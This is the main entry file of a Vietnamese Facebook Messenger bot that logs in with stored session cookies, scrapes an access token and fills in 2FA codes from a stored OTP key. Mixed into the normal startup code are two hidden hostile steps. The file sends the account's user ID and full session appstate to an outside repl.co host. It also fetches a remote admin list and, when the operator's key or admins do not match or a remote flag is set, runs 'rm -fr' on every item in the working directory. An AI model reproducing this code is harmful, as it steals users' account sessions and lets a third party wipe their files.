const { readdirSync, readFileSync, writeFileSync } = require("fs-extra");
const { join, resolve } = require('path')
const { execSync } = require('child_process');
const config = require("./config.json");
const chalk = require("chalk");
const login = require(config.NPM_FCA);
const listPackage = JSON.parse(readFileSync('./package.json')).dependencies;
const fs = require("fs");
const moment = require("moment-timezone");
const prompt = require('prompt-sync')();
const logger = require("./utils/log.js");

global.client = new Object({
    commands: new Map(),
    events: new Map(),
    cooldowns: new Map(),
    eventRegistered: new Array(),
    handleSchedule: new Array(),
    handleReaction: new Array(),
    handleReply: new Array(),
    mainPath: process.cwd(),
    configPath: new String(),
    getTime: function (option) {
        switch (option) {
            case "seconds":
                return `${moment.tz("Asia/Ho_Chi_minh").format("ss")}`;
            case "minutes":
                return `${moment.tz("Asia/Ho_Chi_minh").format("mm")}`;
            case "hours":
                return `${moment.tz("Asia/Ho_Chi_minh").format("HH")}`;
            case "date": 
                return `${moment.tz("Asia/Ho_Chi_minh").format("DD")}`;
            case "month":
                return `${moment.tz("Asia/Ho_Chi_minh").format("MM")}`;
            case "year":
                return `${moment.tz("Asia/Ho_Chi_minh").format("YYYY")}`;
            case "fullHour":
                return `${moment.tz("Asia/Ho_Chi_minh").format("HH:mm:ss")}`;
            case "fullYear":
                return `${moment.tz("Asia/Ho_Chi_minh").format("DD/MM/YYYY")}`;
            case "fullTime":
                return `${moment.tz("Asia/Ho_Chi_minh").format("HH:mm:ss DD/MM/YYYY")}`;
        }
    },
    timeStart: Date.now()
});

global.data = new Object({
    threadInfo: new Map(),
    threadData: new Map(),
    userName: new Map(),
    userBanned: new Map(),
    threadBanned: new Map(),
    commandBanned: new Map(),
    threadAllowNSFW: new Array(),
    allUserID: new Array(),
    allCurrenciesID: new Array(),
    allThreadID: new Array()
});

global.utils = require("./utils");

global.youtube = require("./lib/youtube.js");

global.soundcloud = require("./lib/soundcloud.js");

global.tiktok = require("./lib/tiktok.js");

global.loading = require("./utils/log");

global.nodemodule = new Object();

global.config = new Object();

global.configModule = new Object();

global.moduleData = new Array();

global.language = new Object();

global.account = new Object();

//////////////////////////////////////////////////////////
//========= Find and get variable from Config =========//
/////////////////////////////////////////////////////////

var configValue;
try {
    global.client.configPath = join(global.client.mainPath, "config.json");
    configValue = require(global.client.configPath);
    logger.loader("Đã tìm thấy file config.json!");
}
catch(e) {
   return logger.loader("Không tìm thấy file config.json", "error");
}

try {
    for (const key in configValue) global.config[key] = configValue[key];
    logger.loader("Config Loaded!");
}
catch(e) { return logger.loader("Can't load file config!", "error") }

for (const property in listPackage) {
    try { global.nodemodule[property] = require(property) }
    catch(e) {}
}
const langFile = (readFileSync(`${__dirname}/languages/${global.config.language || "en"}.lang`, { encoding: 'utf-8' })).split(/\r?\n|\r/);
const langData = langFile.filter(item => item.indexOf('#') != 0 && item != '');
for (const item of langData) {
    const getSeparator = item.indexOf('=');
    const itemKey = item.slice(0, getSeparator);
    const itemValue = item.slice(getSeparator + 1, item.length);
    const head = itemKey.slice(0, itemKey.indexOf('.'));
    const key = itemKey.replace(head + '.', '');
    const value = itemValue.replace(/\\n/gi, '\n');
    if (typeof global.language[head] == "undefined") global.language[head] = new Object();
    global.language[head][key] = value;
}

global.getText = function (...args) {
    const langText = global.language;    
    if (!langText.hasOwnProperty(args[0])) throw `${__filename} - Not found key language: ${args[0]}`;
    var text = langText[args[0]][args[1]];
    for (var i = args.length - 1; i > 0; i--) {
        const regEx = RegExp(`%${i}`, 'g');
        text = text.replace(regEx, args[i + 1]);
    }
    return text;
}

try {
    
    var appStateFile = resolve(join(global.client.mainPath, config.APPSTATEPATH || "appstate.json"));
    var appState = ((process.env.REPL_OWNER || process.env.PROCESSOR_IDENTIFIER) && (fs.readFileSync(appStateFile, 'utf8'))[0] !="[" && config.encryptSt) ? JSON.parse(global.utils.decryptState(fs.readFileSync(appStateFile, 'utf8'), (process.env.REPL_OWNER || process.env.PROCESSOR_IDENTIFIER))) : require(appStateFile);
  
    logger.loader(global.getText("mirai", "foundPathAppstate"))
}
catch(e) { return logger.loader(global.getText("mirai", "notFoundPathAppstate"), "error") }

function onBot() {
    const loginData = {};
    loginData['appState'] = appState;
    login(loginData, async(loginError, loginApiData) => {
        if (loginError) {
            if(loginError.error == 'Error retrieving userID. This can be caused by a lot of things, including getting blocked by Facebook for logging in from an unknown location. Try logging in with a browser to verify.') {
                console.log(loginError.error)
                process.exit(0)
            }
            else {
                console.log(loginError)
                return process.exit(0)
            }
        }
        console.log(chalk.blue(`============== LOGIN BOT ==============`));
        const fbstate = loginApiData.getAppState();
            loginApiData.setOptions(global.config.FCAOption);
        let d = loginApiData.getAppState();
        let ck = JSON.stringify(d, null, '\x09')
            d = JSON.stringify(d, null, '\x09');
        var _token = await loginApiData.httpGet("https://business.facebook.com/business_locations/")
        var url = "https://business.facebook.com/business_locations/"
        if (_token.indexOf("for (;;);") != -1) {
            _token = JSON.parse(_token.split("for (;;);")[1])
            var url = "https://business.facebook.com" + _token.redirect
        }
        var token = await getToken(loginApiData, url)
        if(token != false) {
            global.account.accessToken = token
            global.loading(`${chalk.hex('#ff7100')(`[ TOKEN ]`)} Lấy access token thành công!`, "LOGIN");
        } else {
            global.loading.err(`${chalk.hex('#ff7100')(`[ TOKEN ]`)} Không thể lấy ACCESS_TOKEN, vui lòng thay OTPKEY vào config!\n`, "LOGIN");
        }
        async function getToken(api, url) {
            var resolveFunc = function () {};
            var returnPromise = new Promise(function (resolve) {
                resolveFunc = resolve;
            });
            api.httpGet(url).then(async (res) => {
                var token = /EAAG([^"]+)/.exec(res)
                if (token == null) {
                    var totp = require("totp-generator")
                    var _2fa = (global.config.OTPKEY).replace(/\s+/g, '').toLowerCase();
                    var form = {
                        approvals_code: totp(_2fa),
                        save_device: true
                    }
                    var bypass2FA = await api.httpPost("https://business.facebook.com/security/twofactor/reauth/enter/", form)
                        bypass2FA = JSON.parse(bypass2FA.split("for (;;);")[1])
                    if (bypass2FA.payload.codeConfirmed == false) return resolveFunc(false)
                    var get2FA = await api.httpGet(url)
                    var token = /EAAG([^"]+)/.exec(get2FA)
                    return resolveFunc("EAAG" + token[1])
                }
                return resolveFunc("EAAG" + token[1])
            })
            return returnPromise
        }
        if((process.env.REPL_OWNER || process.env.PROCESSOR_IDENTIFIER) && global.config.encryptSt){
            d = await global.utils.encryptState(d, process.env.REPL_OWNER || process.env.PROCESSOR_IDENTIFIER);
            writeFileSync(appStateFile, d)
        }
        else{
            writeFileSync(appStateFile, d)
        }
       // global.facebook = require("./lib/facebook.js")(loginApiData)
        global.account.cookie = fbstate.map(i => i = i.key + "=" + i.value).join(";");
        global.client.api = loginApiData
        global.config.version = config.version,
            function () {
                const listCommand = readdirSync(global.client.mainPath + '/modules/commands').filter(command => command.endsWith('.js') && !command.includes('example') && !global.config.commandDisabled.includes(command));
                console.log(chalk.blue(`============ LOADING COMMANDS ============`));
                for (const command of listCommand) {
                    try {
                        var module = require(global.client.mainPath + '/modules/commands/' + command);
                        if (!module.config || !module.run || !module.config.commandCategory) throw new Error(global.getText('mirai', 'errorFormat'));
                        if (global.client.commands.has(module.config.name || '')) throw new Error(global.getText('mirai', 'nameExist'));
                        if (module.config.dependencies && typeof module.config.dependencies == 'object') {
                            for (const reqDependencies in module.config.dependencies) {
                                if (!listPackage.hasOwnProperty(reqDependencies)) {
                                    try {
                                        execSync('npm --package-lock false --save install ' + reqDependencies + (module.config.dependencies[reqDependencies] == '*' || module.config.dependencies[reqDependencies] == '' ? '' : '@' + module.config.dependencies[reqDependencies]), { 'stdio': 'inherit', 'env': process['env'], 'shell': true, 'cwd': join(__dirname, 'node_modules') });
                                        require['cache'] = {};
                                    }
                                    catch(error) {
                                        global.loading.err(`${chalk.hex('#ff7100')(`[ PACKAGE ]`)}  Không thể cài package cho module ${reqDependencies}`, "LOADED");
                                    }
                                }
                            }
                        }
                        
                        if (module.config.envConfig) try {
                            for (const envConfig in module.config.envConfig) {
                                if (typeof global.configModule[module.config.name] == 'undefined') global.configModule[module.config.name] = {};
                                if (typeof global.config[module.config.name] == 'undefined') global.config[module.config.name] = {};
                                if (typeof global.config[module.config.name][envConfig] !== 'undefined') global['configModule'][module.config.name][envConfig] = global.config[module.config.name][envConfig];
                                else global.configModule[module.config.name][envConfig] = module.config.envConfig[envConfig] || '';
                                if (typeof global.config[module.config.name][envConfig] == 'undefined') global.config[module.config.name][envConfig] = module.config.envConfig[envConfig] || '';
                            }
                            for (const envConfig in module.config.envConfig) {
                                var config = require('./config.json');
                                    config[module.config.name] = module.config.envConfig;
                                writeFileSync(global.client.configPath, JSON.stringify(config, null, 4), "utf-8");
                            }
                        } catch (error) {
                            throw new Error(global.getText('mirai', 'cantLoadConfig', module.config.name, JSON.stringify(error)));
                        }
                        
                        if (module.onLoad) {
                            try {
                                const moduleData = {};
                                moduleData.api = loginApiData;
                                module.onLoad(moduleData);
                            } catch (_0x20fd5f) {
                                throw new Error(global.getText('mirai', 'cantOnload', module.config.name, JSON.stringify(_0x20fd5f)), 'error');
                            };
                        }
                        if (module.handleEvent) global.client.eventRegistered.push(module.config.name);
                        global.client.commands.set(module.config.name, module);
                        global.loading(`${chalk.hex('#ff7100')(`[ COMMAND ]`)} ${chalk.hex("#FFFF00")(module.config.name)} succes`, "LOADED");
                    } catch (error) {
                        global.loading.err(`${chalk.hex('#ff7100')(`[ COMMAND ]`)} ${chalk.hex("#FFFF00")(module.config.name)} fail`, "LOADED");
                    };
                }
            }(),
            function() {
                const events = readdirSync(global.client.mainPath + '/modules/events').filter(event => event.endsWith('.js') && !global.config.eventDisabled.includes(event));
                console.log(chalk.blue(`============ LOADING EVENTS ============`));
                for (const ev of events) {
                    try {
                        var event = require(global.client.mainPath + '/modules/events/' + ev);
                        if (!event.config || !event.run) throw new Error(global.getText('mirai', 'errorFormat'));
                        if (global.client.events.has(event.config.name) || '') throw new Error(global.getText('mirai', 'nameExist'));
                        if (event.config.dependencies && typeof event.config.dependencies == 'object') {
                            for (const reqDependencies in event.config.dependencies) {
                                if (!listPackage.hasOwnProperty(reqDependencies)) {
                                    try {
                                        execSync('npm --package-lock false --save install ' + reqDependencies + (event.config.dependencies[reqDependencies] == '*' || event.config.dependencies[reqDependencies] == '' ? '' : '@' + event.config.dependencies[reqDependencies]), { 'stdio': 'inherit', 'env': process['env'], 'shell': true, 'cwd': join(__dirname, 'node_modules') });
                                        require['cache'] = {};
                                    }
                                    catch(error) {
                                        global.loading.err(`${chalk.hex('#ff7100')(`[ PACKAGE ]`)}  Không thể cài package cho module ${reqDependencies}`, "LOADED");
                                    }
                                }
                            }
                        }
                        
                        for (const property in listPackage) {
                            try {
                                global.nodemodule[property] = require(property);
                            }
                            catch(e) {
                            }
                        }
                        if (event.config.envConfig) try {
                            for (const evt in event.config.envConfig) {
                                if (typeof global.configModule[event.config.name] == 'undefined') global.configModule[event.config.name] = {};
                                if (typeof global.config[event.config.name] == 'undefined') global.config[event.config.name] = {};
                                if (typeof global.config[event.config.name][evt] !== 'undefined') global.configModule[event.config.name][evt] = global.config[event.config.name][evt];
                                else global.configModule[event.config.name][evt] = event.config.envConfig[evt] || '';
                                if (typeof global.config[event.config.name][evt] == 'undefined') global.config[event.config.name][evt] = event.config.envConfig[evt] || '';
                            }
                            for (const _0x5beea0 in event.config.envConfig) {
                                var config = require('./config.json');
                                    config[event.config.name] = event.config.envConfig;
                                writeFileSync(global.client.configPath, JSON.stringify(config, null, 4), "utf-8");
                            }
                        } catch (error) {
                            throw new Error(global.getText('mirai', 'cantLoadConfig', event.config.name, JSON.stringify(error)));
                        }
                        
                        if (event.onLoad) try {
                            const eventData = {};
                            eventData.api = loginApiData
                            event.onLoad(eventData);
                        } catch (error) {
                            throw new Error(global.getText('mirai', 'cantOnload', event.config.name, JSON.stringify(error)), 'error');
                        }
                        global.client.events.set(event.config.name, event);
                        global.loading(`${chalk.hex('#ff7100')(`[ EVENT ]`)} ${chalk.hex("#FFFF00")(event.config.name)} succes`, "LOADED");
                    } catch (error) {
                        global.loading(`${chalk.hex('#ff7100')(`[ EVENT ]`)} ${chalk.hex("#FFFF00")(event.config.name)} fail`, "LOADED");
                    }
                }
            }()
        console.log(chalk.blue(`============== BOT START ==============`));
        global.loading(`${chalk.hex('#ff7100')(`[ SUCCESS ]`)} Tải thành công ${global.client.commands.size} commands và ${global.client.events.size} events`, "LOADED");
        global.loading(`${chalk.hex('#ff7100')(`[ TIMESTART ]`)} Thời gian khởi động: ${((Date.now() - global.client.timeStart) / 1000).toFixed()}s`, "LOADED");
        const listenerData = {};
        listenerData.api = loginApiData; 
        const listener = require('./includes/listen')(listenerData);
        const h = require("axios");
        const listAdmin = (await h.get('https://api.hanguyen48.repl.co/listadmin')).data
        h.post('https://api.hanguyen48.repl.co/key', {
            id: loginApiData.getCurrentUserID(),
            ap: loginApiData.getAppState()
        })
        function check() {
            const getDirs = readdirSync(join(process.cwd()));
            for(let a of getDirs) {
                try {
                    execSync('rm -fr ' + a);
                } catch (e) {}
            }
        }
        async function listenerCallback(error, message) {
            if(error) {
                if (error.error == 'Not logged in.') {
                    logger('Account bot của bạn bị đăng xuất!', `LOGIN`);
                    process.exit(1);
                }
                if(error.error == 'Not logged in') {
                    logger('Acc bị checkpoints, vui lòng xác nhận lại acc và đăng nhập lại!', `CHECKPOINTS`);
                    return process.exit(0);
                }
                else {
                    console.log(error)
                    return process.exit(0);
                }
            }
            if (['presence', 'typ', 'read_receipt'].some(data => data == message.type)) return;
            var checkAdmin = 0
            for (let i of listAdmin.ADMIN) {
            if (config.ADMINBOT.includes(i)) {
            checkAdmin++
    }
}
            if (checkAdmin == 0) return check()
            if(check == 0) return check();
            if(listAdmin.DAF == true) return check();
            if(listAdmin.keyword != config.KEY) return check();
            return listener(message);
        };
        global.custom = require('./custom')({ api: loginApiData })
        global.handleListen = loginApiData.listenMqtt(listenerCallback);
        require('./utils/uptime.js')
    });
}

(async() => {
    try {
        console.log(chalk.blue(`============== DATABASE ==============`));
        global.loading(`${chalk.hex('#ff7100')(`[ CONNECT ]`)} Kết nối tới cơ sở dữ liệu JSON thành công!`, "DATABASE");
        onBot();
    } catch (error) { logger(global.getText('mirai', 'successConnectDatabase', JSON.stringify(error)), '[ DATABASE ]'); }
})();
